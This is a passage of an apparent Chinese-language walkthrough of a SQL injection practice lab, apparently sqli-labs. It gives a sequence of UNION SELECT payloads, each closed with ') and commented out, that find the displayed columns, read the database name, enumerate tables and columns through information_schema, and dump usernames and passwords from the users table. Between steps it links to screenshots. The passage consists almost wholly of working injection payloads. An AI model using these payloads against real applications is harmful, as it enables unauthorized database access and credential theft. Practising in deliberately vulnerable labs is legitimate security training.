...
　　判断显错位:")union select 1,2 -- lb

![image](assets/image-20250426202010-baz55hl.png)

　　判断库名：")union select 1,database() -- lb

![image](assets/image-20250426202058-gqkwpo2.png)

　　判断表名：")union select 1,group\_concat(table\_name) from information\_schema.tables where table\_schema\='security' -- lb

![image](assets/image-20250426202541-bdmr1wm.png)

　　判断列名：")union select 1,group_concat(column_name) from information_schema.columns where table_name='users' -- lb

![image](assets/image-20250426202623-k5dkh81.png)

　　爆出数据：")union select 1,group\_concat(username ,id , password) from users -- lb
